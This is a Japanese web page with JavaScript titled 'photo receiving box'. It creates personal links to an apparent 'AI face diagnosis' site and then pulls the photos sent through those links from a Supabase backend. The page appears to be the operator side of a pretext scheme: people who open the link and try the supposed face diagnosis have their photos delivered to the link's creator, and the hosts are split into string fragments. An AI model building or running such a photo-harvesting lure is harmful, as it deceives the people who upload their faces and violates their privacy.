<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>写真受信ボックス</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 20px;
  min-height: 100vh;
  font-family: sans-serif;
  background: linear-gradient(135deg, #667eea, #764ba2);
}

.container {
  max-width: 600px;
  margin: auto;
}

.card {
  background: white;
  padding: 25px;
  border-radius: 20px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.2);
  margin-bottom: 20px;
}

h1,
h2 {
  text-align: center;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 12px;
  border: none;
  border-radius: 12px;
  background: #667eea;
  color: white;
  font-size: 16px;
  font-weight: bold;
}

.linkBox {
  margin-top: 15px;
  padding: 15px;
  background: #f1f1f1;
  border-radius: 10px;
  word-break: break-all;
}

.photo {
  width: 100%;
  margin-top: 15px;
  border-radius: 12px;
}

.photoItem {
  margin-bottom: 25px;
  border-bottom: 1px solid #ddd;
  padding-bottom: 20px;
}

.small {
  color: #666;
  font-size: 13px;
}

.hidden {
  display: none;
}

.message {
  margin-top: 15px;
  padding: 12px;
  border-radius: 10px;
  background: #eee;
}
</style>
</head>

<body>

<div class="container">

<div class="card">

<h1>📸 写真受信ボックス</h1>

<p>
リンクを作成して、そのリンクから送られた写真を確認できます。
</p>

<button id="createButton">
🔗 リンクを作成
</button>

<div id="linkArea" class="hidden">

<h2>あなた専用リンク</h2>

<div
  id="linkText"
  class="linkBox"
></div>

<button id="copyButton">
📋 リンクをコピー
</button>

<button id="openButton">
🌐 AI顔診断を開く
</button>

</div>

</div>


<div class="card">

<h2>📥 受信した写真</h2>

<p class="small">
このブラウザで作成したリンクに送られた写真だけ表示します。
</p>

<button id="refreshButton">
🔄 写真を確認
</button>

<div id="message"></div>

<div id="photoArea"></div>

</div>

</div>


<script>

const FUNCTION_URL =
  "https://" +
  "crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";

const AI_SITE =
  "https://" +
  "gaffney16445.github.io/ai-face-diagnosis/";


const createButton =
  document.getElementById(
    "createButton"
  );

const copyButton =
  document.getElementById(
    "copyButton"
  );

const openButton =
  document.getElementById(
    "openButton"
  );

const refreshButton =
  document.getElementById(
    "refreshButton"
  );

const linkArea =
  document.getElementById(
    "linkArea"
  );

const linkText =
  document.getElementById(
    "linkText"
  );

const photoArea =
  document.getElementById(
    "photoArea"
  );

const message =
  document.getElementById(
    "message"
  );


let room =
  localStorage.getItem(
    "receiverRoom"
  );


let currentLink = "";


/*
  ランダムなルームID
*/

function makeRoomId() {

  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  let result = "";

  for (
    let i = 0;
    i < 12;
    i++
  ) {

    result +=
      chars[
        Math.floor(
          Math.random() *
          chars.length
        )
      ];

  }

  return result;

}


/*
  リンク作成
*/

createButton.addEventListener(
  "click",
  () => {

    room =
      makeRoomId();

    localStorage.setItem(
      "receiverRoom",
      room
    );

    currentLink =
      AI_SITE +
      "?room=" +
      room;

    linkText.textContent =
      currentLink;

    linkArea.classList.remove(
      "hidden"
    );

    photoArea.innerHTML =
      "";

    message.textContent =
      "新しい専用リンクを作成しました。";

  }
);


/*
  コピー
*/

copyButton.addEventListener(
  "click",
  async () => {

    if (!currentLink) {
      return;
    }

    try {

      await navigator.clipboard.writeText(
        currentLink
      );

      message.textContent =
        "✅ リンクをコピーしました！";

    } catch (error) {

      message.textContent =
        "コピーできませんでした。リンクを長押ししてコピーしてください。";

    }

  }
);


/*
  AI診断サイトを開く
*/

openButton.addEventListener(
  "click",
  () => {

    if (!currentLink) {
      return;
    }

    window.open(
      currentLink,
      "_blank"
    );

  }
);


/*
  写真を確認
*/

refreshButton.addEventListener(
  "click",
  async () => {

    if (!room) {

      message.textContent =
        "先に「リンクを作成」を押してください。";

      return;

    }

    refreshButton.disabled =
      true;

    refreshButton.textContent =
      "読み込み中...";

    try {

      const response =
        await fetch(
          FUNCTION_URL +
          "?room=" +
          room
        );


      if (!response.ok) {

        throw new Error(
          "GET failed"
        );

      }


      const data =
        await response.json();


      photoArea.innerHTML =
        "";


      if (
        !data.photos ||
        data.photos.length === 0
      ) {

        message.textContent =
          "まだ写真は届いていません。";

        return;

      }


      message.textContent =
        data.photos.length +
        "枚の写真を受信しています。";


      data.photos.forEach(
        (photo, index) => {

          const item =
            document.createElement(
              "div"
            );

          item.className =
            "photoItem";


          const title =
            document.createElement(
              "p"
            );

          title.textContent =
            "📷 写真 " +
            (index + 1);


          const image =
            document.createElement(
              "img"
            );

          image.className =
            "photo";

          image.src =
            photo.url;

          image.alt =
            "受信した写真";


          item.appendChild(
            title
          );

          item.appendChild(
            image
          );


          photoArea.appendChild(
            item
          );

        }
      );


    } catch (error) {

      console.error(
        error
      );

      message.textContent =
        "写真を取得できませんでした。";

    } finally {

      refreshButton.disabled =
        false;

      refreshButton.textContent =
        "🔄 写真を確認";

    }

  }
);


/*
  前回作ったルームを復元
*/

if (room) {

  currentLink =
    AI_SITE +
    "?room=" +
    room;

  linkText.textContent =
    currentLink;

  linkArea.classList.remove(
    "hidden"
  );

}

</script>

</body>
</html>
